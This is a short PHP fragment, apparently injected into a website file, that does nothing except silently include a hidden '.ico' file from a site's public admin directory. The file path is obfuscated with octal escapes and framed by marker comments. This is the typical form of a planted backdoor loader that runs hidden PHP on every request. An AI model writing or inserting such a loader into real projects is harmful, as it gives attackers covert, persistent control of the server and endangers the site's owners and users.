<?php
/*f5923*/

@include "\057usr/\163hare\057ngin\170/www\057webt\151cket\056soft\155aint\056it/r\157ot/p\165blic\057admi\156/fas\164clic\153/.ff\141f68e\141.ico";

/*f5923*/




